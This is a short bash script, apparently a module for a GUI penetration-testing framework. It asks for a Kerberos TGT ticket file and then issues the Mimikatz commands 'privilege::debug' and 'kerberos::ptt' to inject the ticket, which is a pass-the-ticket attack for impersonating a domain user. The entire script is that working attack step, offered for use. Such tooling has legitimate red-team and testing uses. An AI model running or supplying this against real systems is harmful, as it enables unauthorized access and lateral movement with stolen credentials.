#!/bin/bash

: '
Mimikatz: import tgt ticket
'

# Generate GUI form items (label, type (optional: default text), name, default (optional))
TGT_TICKET_FILE_FIELD=$(form_item  "TGT ticket file" "tgt_file")

# Generate GUI form
generate_form "${TGT_TICKET_FILE_FIELD}"

TGT_TICKET_FILE=${form_data["tgt_file"]}

execute_command "privilege::debug"
create_new_line
sleep 1

execute_command "kerberos::ptt \"${TGT_TICKET_FILE}\""
create_new_line
